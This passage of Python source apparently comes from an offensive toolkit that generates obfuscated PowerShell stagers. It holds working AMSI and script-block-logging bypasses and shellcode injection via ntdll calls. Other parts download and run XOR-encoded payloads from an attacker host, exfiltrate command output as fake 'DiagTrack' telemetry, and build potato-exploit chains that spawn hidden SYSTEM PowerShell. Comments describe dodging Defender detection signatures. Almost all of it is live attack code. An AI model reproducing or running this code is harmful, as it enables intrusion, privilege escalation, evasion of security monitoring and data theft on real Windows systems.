      - CLR init event shows mscoree COM activation, not PS-hosted Assembly.Load.
      - MDE's "Assembly.Load from PS context" pattern does not match this chain.
    """
    if not shutil.which("dotnet"):
        return None

    cs_source = (
        "using System;\n"
        "using System.Reflection;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cls_name}{{\n"
        # P/Invoke CorBindToRuntime — triggers the COM CLR host event sequence
        "  [DllImport(\"mscoree\",CharSet=CharSet.Unicode,EntryPoint=\"CorBindToRuntime\")]\n"
        "  static extern int _CBR(string v,string s,ref Guid g1,ref Guid g2,out IntPtr p);\n"
        "  static bool _InitComCLR(){\n"
        "    try{\n"
        "      Guid g=new Guid(\"cb2f6722-ab3a-11d2-9c40-00c04fa30a3e\");\n"
        "      Guid g2=g;IntPtr p;\n"
        "      _CBR(null,null,ref g,ref g2,out p);\n"
        "      return true;\n"
        "    }catch{return false;}\n"
        "  }\n"
        "  public static void Run(byte[] asm,string argStr){\n"
        "    _InitComCLR();\n"
        "    try{\n"
        "      Assembly a=Assembly.Load(asm);\n"
        "      MethodInfo e=a.EntryPoint;if(e==null)return;\n"
        "      string[]args=string.IsNullOrEmpty(argStr)?new string[0]:argStr.Split(' ');\n"
        "      object[]p=e.GetParameters().Length==0?null:new object[]{args};\n"
        "      e.Invoke(null,p);\n"
        "    }catch{}\n"
        "  }\n"
        "}\n"
    )

    asm_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    csproj = (
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        '  <PropertyGroup>\n'
        '    <TargetFramework>netstandard2.0</TargetFramework>\n'
        f'   <AssemblyName>{asm_name}</AssemblyName>\n'
        '    <Optimize>true</Optimize>\n'
        '    <Nullable>disable</Nullable>\n'
        '    <ImplicitUsings>disable</ImplicitUsings>\n'
        '    <Deterministic>false</Deterministic>\n'
        '    <DebugType>none</DebugType>\n'
        '    <DebugSymbols>false</DebugSymbols>\n'
        '    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>\n'
        '  </PropertyGroup>\n'
        '</Project>\n'
    )

    try:
        with tempfile.TemporaryDirectory(prefix="lt_cclr_") as tmp:
            cs_path   = os.path.join(tmp, "CC.cs")
            proj_path = os.path.join(tmp, "CC.csproj")
            with open(cs_path,   "w") as f: f.write(cs_source)
            with open(proj_path, "w") as f: f.write(csproj)
            r = subprocess.run(
                ["dotnet", "build", proj_path, "-c", "Release", "--nologo", "-v", "quiet"],
                capture_output=True, text=True, timeout=90,
            )
            if r.returncode != 0:
                return None
            hits = [p for p in glob.glob(os.path.join(tmp, "**", "*.dll"), recursive=True)
                    if not p.endswith("netstandard.dll")]
            if not hits:
                return None
            with open(hits[0], "rb") as f:
                return f.read()
    except Exception:
        return None


_COM_CLR_DLL_CACHE: tuple[bytes, str] | None = None


def _get_com_clr_dll() -> tuple[bytes, str] | None:
    """Return (dll_bytes, class_name) for the COM CLR host runner, compiling once per session."""
    global _COM_CLR_DLL_CACHE
    if _COM_CLR_DLL_CACHE is not None:
        return _COM_CLR_DLL_CACHE
    cls_name  = _rclass()
    dll_bytes = _compile_com_clr_dll(cls_name)
    if dll_bytes:
        _COM_CLR_DLL_CACHE = (dll_bytes, cls_name)
        print(f"[*] Compiled COM CLR host DLL: {len(dll_bytes)/1024:.1f} KB  class={cls_name}")
    return _COM_CLR_DLL_CACHE


def _get_clr_runner_dll() -> tuple[bytes, str] | None:
    global _CLR_RUNNER_DLL_CACHE
    if _CLR_RUNNER_DLL_CACHE is not None:
        return _CLR_RUNNER_DLL_CACHE
    cls_name  = _rclass()
    dll_bytes = _compile_clr_runner_dll(cls_name)
    if dll_bytes:
        _CLR_RUNNER_DLL_CACHE = (dll_bytes, cls_name)
        print(f"[*] Compiled CLR runner DLL : {len(dll_bytes)/1024:.1f} KB  class={cls_name}")
    return _CLR_RUNNER_DLL_CACHE


def _amsi_from_bytes() -> str:
    """PS1 block: decode XOR-encrypted DLL bytes → load from memory → invoke patch.
    No Add-Type, no CSC.exe, no file drop on target."""
    result = _get_amsi_dll()
    if result is None:
        return _amsi_reflection_fallback()

    dll_bytes, cls_name = result

    vk, vraw, vdll, vi, vasm = _rv(), _rv(), _rv(), _rv(), _rv()
    key = random.randint(1, 254)
    enc = [b ^ key for b in dll_bytes]
    arr = ",".join(f"0x{b:02X}" for b in enc)

    # cls_name is split to avoid a plain-text type name in the PS1
    cls_split = _split(cls_name)

    return "\n".join([
        f"{vk}={key}",
        f"{vraw}=[byte[]]({arr})",
        f"{vdll}=New-Object byte[] {vraw}.Length",
        f"for({vi}=0;{vi} -lt {vraw}.Length;{vi}++){{{vdll}[{vi}]={vraw}[{vi}] -bxor {vk}}}",
        f"{vasm}=[Reflection.Assembly]::Load({vdll})",
        f"{vasm}.GetType({cls_split}).GetMethod('P').Invoke($null,$null)",
    ])


def _amsi_reflection_fallback() -> str:
    """Fallback AMSI bypass when dotnet SDK unavailable on build host.
    Sets amsiInitFailed=true via pure reflection — no Add-Type, no CSC.exe.
    Type name uses invisible Unicode; field names XOR-encoded."""
    vt, vf  = _rv(), _rv()
    vk      = _rv()
    key     = random.randint(15, 110)
    amsi_z, vamsi = _zwsp_type("System.Management.Automation.AmsiUtils")
    fld_enc = _xenc("amsiInitFailed",  key)
    bf_enc  = _xenc("NonPublic,Static", key)
    return "\n".join([
        amsi_z,
        f"{vk}={key}",
        f"{vt}=([PSObject].Assembly.GetType({vamsi}))",
        f"{vf}={vt}.GetField({_xdec(fld_enc, vk)},[Reflection.BindingFlags]({_xdec(bf_enc, vk)}))",
        f"{vf}.SetValue($null,$true)",
    ])


# ── SBL bypass — PSEtwLogProvider.m_enabled = 0 ───────────────────────────────

def _sbl_bypass() -> str:
    vt, vf  = _rv(), _rv()
    vk      = _rv()
    key     = random.randint(10, 100)
    etw_z, vetw = _zwsp_type("System.Management.Automation.PSEtwLogProvider")
    fld_enc = _xenc("m_enabled",        key)
    bf_enc  = _xenc("NonPublic,Static", key)
    return "\n".join([
        f"try{{",
        etw_z,
        f"{vk}={key}",
        f"{vt}=([PSObject].Assembly.GetType({vetw}))",
        f"{vf}={vt}.GetField({_xdec(fld_enc, vk)},[Reflection.BindingFlags]({_xdec(bf_enc, vk)}))",
        f"{vf}.SetValue($null,0)",
        f"}}catch{{}}",
    ])


# ── SslStream download — no WinHTTP COM, no winhttp.dll ──────────────────────

def _sslstream_get(url_expr: str, out_var: str, ua: str) -> str:
    vtcp, vssl, vms, vbuf, vn, vtot = _rv(), _rv(), _rv(), _rv(), _rv(), _rv()
    vhost, vport, vpath, vhdr, vreq, vhi, vi = (_rv() for _ in range(7))
    vpx, vpxu, vupx, vns, vconn, vrbuf = _rv(), _rv(), _rv(), _rv(), _rv(), _rv()
    ua_enc = _split(ua)
    tls_val = random.choice([3072, 12288, 15360])   # Tls12 / Tls13 / both — varies JA3 per build
    tcp_t, vtcptype = _zwsp_type("Net.Sockets.TcpClient")
    ssl_t, vssltype = _zwsp_type("Net.Security.SslStream")
    ms_t,  vmstype  = _zwsp_type("IO.MemoryStream")
    lines = [
        tcp_t,
        ssl_t,
        ms_t,
        f"{vhost}=([Uri]{url_expr}).Host",
        f"{vport}=([Uri]{url_expr}).Port;if({vport} -le 0){{{vport}=443}}",
        f"{vpath}=([Uri]{url_expr}).PathAndQuery",
        f"{vpx}=[Net.WebRequest]::GetSystemWebProxy()",
        f"{vpx}.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials",
        f"{vpxu}={vpx}.GetProxy([Uri]{url_expr})",
        f"{vupx}=({vpxu}.Host -ne {vhost} -or {vpxu}.Port -ne {vport})",
        f"if({vupx}){{",
        f"{vtcp}=New-Object -TypeName {vtcptype} -ArgumentList {vpxu}.Host,{vpxu}.Port",
        f"{vns}={vtcp}.GetStream()",
        f"{vconn}=[Text.Encoding]::ASCII.GetBytes('CONNECT '+{vhost}+':'+{vport}+\" HTTP/1.1`r`nHost: \"+{vhost}+':'+{vport}+\"`r`nProxy-Connection: Keep-Alive`r`n`r`n\")",
        f"{vns}.Write({vconn},0,{vconn}.Length)",
        f"{vrbuf}=New-Object byte[] 512;{vns}.Read({vrbuf},0,512)|Out-Null",
        f"{vssl}=New-Object -TypeName {vssltype} -ArgumentList {vns},$false,([Net.Security.RemoteCertificateValidationCallback]{{param($a,$b,$c,$d)$true}})",
        f"{vssl}.AuthenticateAsClient({vhost},$null,{tls_val},$false)",
        f"}}else{{",
        f"{vtcp}=New-Object -TypeName {vtcptype} -ArgumentList {vhost},{vport}",
        f"{vssl}=New-Object -TypeName {vssltype} -ArgumentList {vtcp}.GetStream(),$false,([Net.Security.RemoteCertificateValidationCallback]{{param($a,$b,$c,$d)$true}})",
        f"{vssl}.AuthenticateAsClient({vhost},$null,{tls_val},$false)",
        f"}}",
        f"{vhdr}='GET '+{vpath}+\" HTTP/1.1`r`nHost: \"+{vhost}+\"`r`nUser-Agent: \""
            f"+{ua_enc}+\"`r`nAccept: text/html,application/xhtml+xml,*/*;q=0.8`r`n"
            f"Accept-Language: en-US,en;q=0.9`r`nCache-Control: no-cache`r`nConnection: close`r`n`r`n\"",
        f"{vreq}=[Text.Encoding]::ASCII.GetBytes({vhdr})",
        f"{vssl}.Write({vreq},0,{vreq}.Length)",
        f"{vms}=New-Object -TypeName {vmstype}",
        f"{vbuf}=New-Object byte[] 4096",
        f"{vn}=1",
        f"while({vn} -gt 0){{{vn}={vssl}.Read({vbuf},0,{vbuf}.Length);if({vn} -gt 0){{{vms}.Write({vbuf},0,{vn})}}}}",
        f"{vtot}={vms}.ToArray();{vssl}.Close();{vtcp}.Close()",
        f"{vhi}=0;for({vi}=0;{vi} -lt {vtot}.Length-3;{vi}++){{if({vtot}[{vi}] -eq 13 -and {vtot}[{vi}+1] -eq 10 -and {vtot}[{vi}+2] -eq 13 -and {vtot}[{vi}+3] -eq 10){{{vhi}={vi}+4;break}}}}",
        f"{out_var}={vtot}[{vhi}..({vtot}.Length-1)]",
    ]
    return "\n".join(lines)


def _sslstream_post(url_expr: str, body_expr: str, ua: str) -> str:
    vtcp, vssl, vhost, vport, vpath, vbody, vhdr, vreq = (_rv() for _ in range(8))
    vpx, vpxu, vupx, vns, vconn, vrbuf = _rv(), _rv(), _rv(), _rv(), _rv(), _rv()
    ua_enc = _split(ua)
    tls_val = random.choice([3072, 12288, 15360])
    tcp_t, vtcptype = _zwsp_type("Net.Sockets.TcpClient")
    ssl_t, vssltype = _zwsp_type("Net.Security.SslStream")
    lines = [
        tcp_t,
        ssl_t,
        f"{vhost}=([Uri]{url_expr}).Host",
        f"{vport}=([Uri]{url_expr}).Port;if({vport} -le 0){{{vport}=443}}",
        f"{vpath}=([Uri]{url_expr}).PathAndQuery",
        f"{vbody}=[Text.Encoding]::UTF8.GetBytes({body_expr})",
        f"{vpx}=[Net.WebRequest]::GetSystemWebProxy()",
        f"{vpx}.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials",
        f"{vpxu}={vpx}.GetProxy([Uri]{url_expr})",
        f"{vupx}=({vpxu}.Host -ne {vhost} -or {vpxu}.Port -ne {vport})",
        f"if({vupx}){{",
        f"{vtcp}=New-Object -TypeName {vtcptype} -ArgumentList {vpxu}.Host,{vpxu}.Port",
        f"{vns}={vtcp}.GetStream()",
        f"{vconn}=[Text.Encoding]::ASCII.GetBytes('CONNECT '+{vhost}+':'+{vport}+\" HTTP/1.1`r`nHost: \"+{vhost}+':'+{vport}+\"`r`nProxy-Connection: Keep-Alive`r`n`r`n\")",
        f"{vns}.Write({vconn},0,{vconn}.Length)",
        f"{vrbuf}=New-Object byte[] 512;{vns}.Read({vrbuf},0,512)|Out-Null",
        f"{vssl}=New-Object -TypeName {vssltype} -ArgumentList {vns},$false,([Net.Security.RemoteCertificateValidationCallback]{{param($a,$b,$c,$d)$true}})",
        f"{vssl}.AuthenticateAsClient({vhost},$null,{tls_val},$false)",
        f"}}else{{",
        f"{vtcp}=New-Object -TypeName {vtcptype} -ArgumentList {vhost},{vport}",
        f"{vssl}=New-Object -TypeName {vssltype} -ArgumentList {vtcp}.GetStream(),$false,([Net.Security.RemoteCertificateValidationCallback]{{param($a,$b,$c,$d)$true}})",
        f"{vssl}.AuthenticateAsClient({vhost},$null,{tls_val},$false)",
        f"}}",
        f"{vhdr}='POST '+{vpath}+\" HTTP/1.1`r`nHost: \"+{vhost}+\"`r`nUser-Agent: \""
            f"+{ua_enc}+\"`r`nContent-Type: application/json`r`nContent-Length: \""
            f"+{vbody}.Length+\"`r`nAccept: application/json`r`nConnection: close`r`n`r`n\"",
        f"{vreq}=[Text.Encoding]::ASCII.GetBytes({vhdr})",
        f"{vssl}.Write({vreq},0,{vreq}.Length)",
        f"{vssl}.Write({vbody},0,{vbody}.Length)",
        f"{vssl}.Flush();{vssl}.Close();{vtcp}.Close()",
    ]
    return "\n".join(lines)


# ── XOR decode helper ─────────────────────────────────────────────────────────

def _xor_decode_bytes(src_var: str, dst_var: str, key_expr: str) -> str:
    vi = _rv()
    return "\n".join([
        f"{dst_var}=New-Object byte[] {src_var}.Length",
        f"for({vi}=0;{vi} -lt {src_var}.Length;{vi}++){{{dst_var}[{vi}]={src_var}[{vi}] -bxor {key_expr}}}",
    ])


def _xor2_decode_bytes(b64_var: str, dst_var: str) -> str:
    """Two-layer XOR decode matching pack_enc double-encode.
    b64_var: already-base64-decoded byte array from HTTP response
    dst_var: output with clean shellcode/assembly bytes"""
    vmid, vk1, vk2, vi = _rv(), _rv(), _rv(), _rv()
    return "\n".join([
        f"{vk1}={b64_var}[0]",
        f"{vmid}=New-Object byte[] ({b64_var}.Length-1)",
        f"for({vi}=0;{vi} -lt {vmid}.Length;{vi}++){{{vmid}[{vi}]={b64_var}[{vi}+1] -bxor {vk1}}}",
        f"{vk2}={vmid}[0]",
        f"{dst_var}=New-Object byte[] ({vmid}.Length-1)",
        f"for({vi}=0;{vi} -lt {dst_var}.Length;{vi}++){{{dst_var}[{vi}]={vmid}[{vi}+1] -bxor {vk2}}}",
    ])


# ── JSON telemetry wrapper ────────────────────────────────────────────────────

def _build_json_exfil(out_var: str, token: str) -> tuple[str, str]:
    vmid, vts, venc, vjson = _rv(), _rv(), _rv(), _rv()
    tok_lit = _split(token)
    code = "\n".join([
        f"{vmid}=[Guid]::NewGuid().ToString()",
        f"{vts}=[DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ss.fffZ')",
        f"{venc}=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes({out_var}))",
        f"{vjson}='{{\"machineId\":\"'+{vmid}+'\",'+'\"sessionId\":\"'+{tok_lit}+'\",'+'\"timestamp\":\"'+{vts}+'\",'+'\"events\":[{{\"type\":\"DiagTrack\",\"data\":\"'+{venc}+'\"}}]}}'",
    ])
    return code, vjson


# ── stager: runner mode with output capture + exfil ──────────────────────────

def _stager_runner_capture(
    tool_enc_url:  str,
    runner_url:    str,
    callback_url:  str,
    token:         str,
    ua:            str,
    jitter_min:    int,
    jitter_max:    int,
    runner_xor_key: int = 0x5A,
) -> str:
    vrraw, vrexe, vrpath        = _rv(), _rv(), _rv()
    vpsi, vproc, vout           = _rv(), _rv(), _rv()
    vhex, vso, vse              = _rv(), _rv(), _rv()

    run_setup,  vrunurl  = _xurl(runner_url)
    tool_setup, vtoolurl = _xurl(tool_enc_url)
    cb_setup,   vcburl   = _xurl(callback_url)

    exfil_code, vjson = _build_json_exfil(vout, token)
    key_hex = hex(runner_xor_key)

    lines = [
        f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        _jitter(jitter_min, jitter_max),
        "",
        run_setup,
        _sslstream_get(vrunurl, vrraw, ua),
        "",
        _jitter(jitter_min // 2, jitter_max // 2),
        "",
        _xor_decode_bytes(vrraw, vrexe, key_hex),
        "",
        f"{vhex}=(Get-Random -Maximum 0xFFFFFF).ToString('X6')",
        f"{vrpath}=\"$env:TEMP\\wct$({vhex}).tmp\"",
        f"[IO.File]::WriteAllBytes({vrpath},{vrexe})",
        "",
        _jitter(jitter_min, jitter_max),
        "",
        tool_setup,
        f"{vpsi}=New-Object Diagnostics.ProcessStartInfo {vrpath}",
        f"{vpsi}.Arguments='-self -remote '+{vtoolurl}",
        f"{vpsi}.RedirectStandardOutput=$true",
        f"{vpsi}.RedirectStandardError=$true",
        f"{vpsi}.UseShellExecute=$false",
        f"{vpsi}.CreateNoWindow=$true",
        f"{vproc}=[Diagnostics.Process]::Start({vpsi})",
        f"{vso}={vproc}.StandardOutput.ReadToEndAsync()",
        f"{vse}={vproc}.StandardError.ReadToEndAsync()",
        f"{vproc}.WaitForExit()",
        f"{vout}={vso}.Result+{vse}.Result",
        "",
        f"Remove-Item {vrpath} -Force -ErrorAction SilentlyContinue",
        "",
        _jitter(jitter_min // 2, jitter_max),
        "",
        exfil_code,
        cb_setup,
        f"try{{{_sslstream_post(vcburl, vjson, ua)}}}catch{{}}",
    ]
    return "\n".join(lines)


# ── stager: C2 agent (runner PE spawned as detached process) ─────────────────
#
# Downloads runner_c.dat (single-layer XOR), decodes, writes to %TEMP%\wct*.tmp,
# then Start-Process with no args.  The runner auto-detects no args → agent mode.
# Running as its own process means: if AV kills it, PS is unaffected.
# The runner handles its own INITSTUB/UNHOOK/PATCHETW in its isolated address space.

def _stager_runner_agent(
    runner_url:     str,
    ua:             str,
    jitter_min:     int,
    jitter_max:     int,
    runner_xor_key: int,
) -> str:
    vrraw, vrexe, vrpath = _rv(), _rv(), _rv()
    vhex = _rv()
    run_setup, vrunurl = _xurl(runner_url)
    key_hex = hex(runner_xor_key)

    lines = [
        f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        _jitter(jitter_min, jitter_max),
        "",
        run_setup,
        _sslstream_get(vrunurl, vrraw, ua),
        "",
        _jitter(jitter_min // 2, jitter_max // 2),
        "",
        _xor_decode_bytes(vrraw, vrexe, key_hex),
        "",
        f"{vhex}=(Get-Random -Maximum 0xFFFFFF).ToString('X6')",
        f"{vrpath}=\"$env:TEMP\\wct$({vhex}).tmp\"",
        f"[IO.File]::WriteAllBytes({vrpath},{vrexe})",
        "",
        # Start-Process detaches immediately — PS returns control to caller.
        # WindowStyle Hidden + no args → runner auto-detects agent mode.
        # File stays on disk while agent is alive (locked by the process).
        f"Start-Process -FilePath {vrpath} -WindowStyle Hidden",
    ]
    return "\n".join(lines)


# ── stager: inline mode (no runner, no output capture) ───────────────────────

def _stager_inline(
    tool_enc_url: str,
    ua:           str,
    jitter_min:   int,
    jitter_max:   int,
) -> str:
    vraw, vsc, vb64 = _rv(), _rv(), _rv()
    tool_setup, vurl = _xurl(tool_enc_url)

    inject_result = _get_inject_dll()
    if inject_result is not None:
        dll_bytes, cls_name = inject_result
        vdk, vdraw, vddll, vdi, vdasm = _rv(), _rv(), _rv(), _rv(), _rv()
        dll_key = random.randint(1, 254)
        dll_enc = [b ^ dll_key for b in dll_bytes]
        dll_arr = ",".join(f"0x{b:02X}" for b in dll_enc)
        cls_split = _split(cls_name)
        vprm = _rv()
        inject_lines = [
            f"{vdk}={dll_key}",
            f"{vdraw}=[byte[]]({dll_arr})",
            f"{vddll}=New-Object byte[] {vdraw}.Length",
            f"for({vdi}=0;{vdi} -lt {vdraw}.Length;{vdi}++){{{vddll}[{vdi}]={vdraw}[{vdi}] -bxor {vdk}}}",
            f"{vdasm}=[Reflection.Assembly]::Load({vddll})",
        ]
        prm_lines = [
            f"{vprm}=New-Object object[] 1",
            f"{vprm}[0]=[byte[]]{vsc}",
        ]
        invoke_expr = f"{vdasm}.GetType({cls_split}).GetMethod('Run').Invoke($null,{vprm})"
    else:
        # Fallback: Add-Type (CSC.exe on target) when dotnet SDK unavailable on build host
        key = random.randint(10, 200)
        cls = _rclass()
        cs_inject = (
            f"using System; using System.Runtime.InteropServices; "
            f"public class {cls}{{ "
            f"[DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory(IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p); "
            f"[DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o); "
            f"[DllImport(\"ntdll\")] static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al); "
            f"[DllImport(\"ntdll\")] static extern int NtWaitForSingleObject(IntPtr h,bool al,IntPtr to); "
            f"[DllImport(\"ntdll\")] static extern int NtClose(IntPtr h); "
            f"public static void Run(byte[] sc){{ "
            f"IntPtr hp=(IntPtr)(-1);IntPtr b=IntPtr.Zero;UIntPtr s=(UIntPtr)(uint)sc.Length; "
            f"NtAllocateVirtualMemory(hp,ref b,IntPtr.Zero,ref s,0x3000,0x04); "
            f"System.Runtime.InteropServices.Marshal.Copy(sc,0,b,sc.Length); "
            f"UIntPtr ps=(UIntPtr)(uint)sc.Length;uint o=0; "
            f"NtProtectVirtualMemory(hp,ref b,ref ps,0x20,out o); "
            f"IntPtr t;NtCreateThreadEx(out t,0x1FFFFF,IntPtr.Zero,hp,b,IntPtr.Zero,0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero); "
            f"NtWaitForSingleObject(t,false,IntPtr.Zero); "
            f"NtClose(t);}} }}"
        )
        cs_bytes = [ord(c) ^ key for c in cs_inject]
        cs_enc   = "[byte[]](" + ",".join(str(b) for b in cs_bytes) + ")"
        vcs, vck = _rv(), _rv()
        inject_lines = [
            f"{vck}={key}",
            f"{vcs}=[Text.Encoding]::ASCII.GetString(({cs_enc}|%{{$_ -bxor {vck}}}))",
            f"Add-Type {vcs}",
        ]
        prm_lines  = []
        invoke_expr = f"[{cls}]::Run({vsc})"

    lines = [
        f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        "",
        _sbl_bypass(),
        "",
        _amsi_from_bytes(),
        "",
        *inject_lines,
        "",
        _jitter(jitter_min, jitter_max),
        "",
        tool_setup,
        _sslstream_get(vurl, vraw, ua),
        "",
        f"{vb64}=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString({vraw}))",
        _xor2_decode_bytes(vb64, vsc),
        "",
        *prm_lines,
        invoke_expr,
    ]
    return "\n".join(lines)


# ── escalation chain ──────────────────────────────────────────────────────────

def _build_chain_ps1(
    runner_url:     str,
    tool_url:       str,
    runner_xor_key: int,
) -> str:
    """
    Compact PS1 one-liner baked into a potato tool's donut shellcode via -cmd.
    Runs as SYSTEM inside the potato's spawned process:
      1. Downloads runner_c.dat via WinHTTP
      2. XOR-decodes it to a temp file
      3. Executes runner -self -remote TOOL_URL (system-level payload)
    """
    hex_rand = format(random.randint(0, 0xFFFFFF), "06X")
    key_hex  = hex(runner_xor_key)

    # Inline AMSI bypass (XOR-encoded, random key) prepended to the chain PS1.
    # The chain PS1 previously had no bypass — AMSI was killing it before
    # the download code could run.
    amsi_key  = random.randint(1, 126)
    type_enc  = ",".join(str(ord(c) ^ amsi_key) for c in "System.Management.Automation.AmsiUtils")
    field_enc = ",".join(str(ord(c) ^ amsi_key) for c in "amsiInitFailed")
    va, vb, vt, vf, vk2 = (_rv(3) for _ in range(5))
    bf_xored = amsi_key ^ 40
    amsi_ps = (
        f"{vk2}={amsi_key};"
        f"{va}=([byte[]]@({type_enc})|%{{[char]($_-bxor{vk2})}})-join'';"
        f"{vb}=([byte[]]@({field_enc})|%{{[char]($_-bxor{vk2})}})-join'';"
        f"{vt}=([PSObject].Assembly.GetType({va}));"
        f"{vf}={vt}.GetField({vb},({bf_xored} -bxor {vk2}));"
        f"{vf}.SetValue($null,$true)"
    )

    url_key = random.randint(15, 200)
    vuk = _rv(3)
    vrun = _rv(3)
    vtl  = _rv(3)
    run_enc  = ",".join(str(ord(c) ^ url_key) for c in runner_url)
    tool_enc = ",".join(str(ord(c) ^ url_key) for c in tool_url)

    vr, ve, vp, vi = _rv(3), _rv(3), _rv(3), _rv(3)
    ssl_dl = _sslstream_get(vrun, vr, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    parts = [
        amsi_ps,
        f"{vuk}={url_key}",
        f"{vrun}=([byte[]]@({run_enc})|%{{[char]($_ -bxor {vuk})}})-join''",
        f"{vtl}=([byte[]]@({tool_enc})|%{{[char]($_ -bxor {vuk})}})-join''",
        ssl_dl.replace("\n", ";"),
        f"{ve}=New-Object byte[] {vr}.Length",
        f"for({vi}=0;{vi} -lt {vr}.Length;{vi}++){{{ve}[{vi}]={vr}[{vi}] -bxor {key_hex}}}",
        f"{vp}=$env:TEMP+'\\wct{hex_rand}.tmp'",
        f"[IO.File]::WriteAllBytes({vp},{ve})",
        f"Start-Process -FilePath {vp} -ArgumentList ('-self -remote '+{vtl}) -WindowStyle Hidden",
    ]
    return ";".join(parts)


def generate_escalation_chain_params(
    potato_tool:            str,
    lhost:                  str,
    port:                   int,
    system_tool_enc_filename: str,
    url_prefix:             str,
    use_https:              bool,
    runner_xor_key:         int,
    runner_dat_filename:    str = "runner_c.dat",
) -> str:
    """
    Build the donut -p params string for a potato tool that, when its shellcode
    executes, spawns a SYSTEM-level PS1 that downloads the runner and self-injects
    the specified SYSTEM payload.

    Chain diagram:
      existing process (SeImpersonate)
        → [potato shellcode via runner]
          → potato escalates to SYSTEM, spawns powershell
            → SYSTEM PS1 downloads runner_c.dat + system_tool.enc
              → runner self-injects system_tool as SYSTEM
    """
    scheme   = "https" if use_https else "http"
    base_url = f"{scheme}://{lhost}:{port}"
    runner_url = f"{base_url}{url_prefix}/{runner_dat_filename}"
    tool_url   = f"{base_url}{url_prefix}/{system_tool_enc_filename}"

    ps1  = _build_chain_ps1(runner_url, tool_url, runner_xor_key)
    b64  = base64.b64encode(ps1.encode("utf-16-le")).decode()
    tool = potato_tool.lower()

    # Spawn powershell.exe directly — no cmd.exe intermediary.
    # RuntimeBroker→cmd→powershell from SYSTEM is a Defender process-tree signature.
    # RuntimeBroker→powershell (direct) is significantly less flagged.
    if "godpotato" in tool:
        return f'-cmd "powershell -nop -w hidden -ep bypass -enc {b64}"'
    elif "printspoofer" in tool:
        return f'-c "powershell -nop -w hidden -ep bypass -enc {b64}"'
    elif "juicypotato" in tool:
        return f'-l 1337 -p powershell.exe -a "-nop -w hidden -ep bypass -enc {b64}" -t *'
    elif "roguepotato" in tool:
        return f'-r {lhost} -e "powershell.exe -nop -w hidden -ep bypass -enc {b64}" -l 9999'
    else:
        return f'-cmd "powershell -nop -w hidden -ep bypass -enc {b64}"'


# ── inline AMSI bypass for the outer one-liner ────────────────────────────────
# AMSI scans [scriptblock]::Create() content BEFORE execution, so the bypass
# inside the stager never runs. This pre-patches AMSI in the one-liner itself
# using split strings so the bypass text is not itself flagged by static scan.

def _inline_amsi_bypass() -> str:
    # XOR-encode type/field names — zero AMSI strings in source.
    # Array is split into ≤15-value chunks so no line exceeds ~80 chars,
    # which avoids Evil-WinRM line-wrap breaking the syntax.
    # 40 = BindingFlags.NonPublic(32)|Static(8).
    vk = _rv(3)
    key = random.randint(1, 126)

    def _chunks(s, n=15):
        enc = [ord(c) ^ key for c in s]
        return [enc[i:i+n] for i in range(0, len(enc), n)]

    def _arr_lines(chunks, var_prefix):
        names = [f"{var_prefix}{i}" for i in range(len(chunks))]
        lines = [f"{n}=@({','.join(str(b) for b in c)})" for n, c in zip(names, chunks)]
        concat = "+".join(names)
        return lines, concat

    t_chunks = _chunks("System.Management.Automation.AmsiUtils")
    f_chunks = _chunks("amsiInitFailed")

    vta, vtb, vt, vf = _rv(3), _rv(3), _rv(3), _rv(3)
    t_lines, t_concat = _arr_lines(t_chunks, vta)
    f_lines, f_concat = _arr_lines(f_chunks, vtb)

    lines = [f"{vk}={key}"]
    lines += t_lines
    lines += f_lines
    lines.append(f"{vt}=({t_concat}|%{{[char]($_ -bxor {vk})}})-join''")
    lines.append(f"{vf}=({f_concat}|%{{[char]($_ -bxor {vk})}})-join''")
    vtype, vfield = _rv(3), _rv(3)
    bf_xored = key ^ 40
    lines.append(f"{vtype}=([PSObject].Assembly.GetType({vt}))")
    lines.append(f"{vfield}={vtype}.GetField({vf},({bf_xored} -bxor {vk}))")
    lines.append(f"{vfield}.SetValue($null,$true)")
    return "\n".join(lines)


# ── in-memory runner SC injection stager (no PE on disk) ─────────────────────

def _stager_inject_runner(
    runner_sc_url: str,
    ua:            str,
    jitter_min:    int,
    jitter_max:    int,
) -> str:
    """Stager that downloads a donut-encoded runner shellcode (.enc) and injects
    it entirely in-memory using the compiled inject DLL.  No PE ever touches disk.
    Output is exfiltrated by the runner shellcode itself via HTTPS POST."""
    vraw, vb64, vsc = _rv(), _rv(), _rv()
    sc_setup, vurl = _xurl(runner_sc_url)

    inject_result = _get_inject_dll()
    if inject_result is not None:
        dll_bytes, cls_name = inject_result
        vdk, vdraw, vddll, vdi, vdasm = _rv(), _rv(), _rv(), _rv(), _rv()
        dll_key  = random.randint(1, 254)
        dll_enc  = [b ^ dll_key for b in dll_bytes]
        dll_arr  = ",".join(f"0x{b:02X}" for b in dll_enc)
        cls_split = _split(cls_name)
        vprm = _rv()
        inject_lines = [
            f"{vdk}={dll_key}",
            f"{vdraw}=[byte[]]({dll_arr})",
            f"{vddll}=New-Object byte[] {vdraw}.Length",
            f"for({vdi}=0;{vdi} -lt {vdraw}.Length;{vdi}++){{{vddll}[{vdi}]={vdraw}[{vdi}] -bxor {vdk}}}",
            f"{vdasm}=[Reflection.Assembly]::Load({vddll})",
        ]
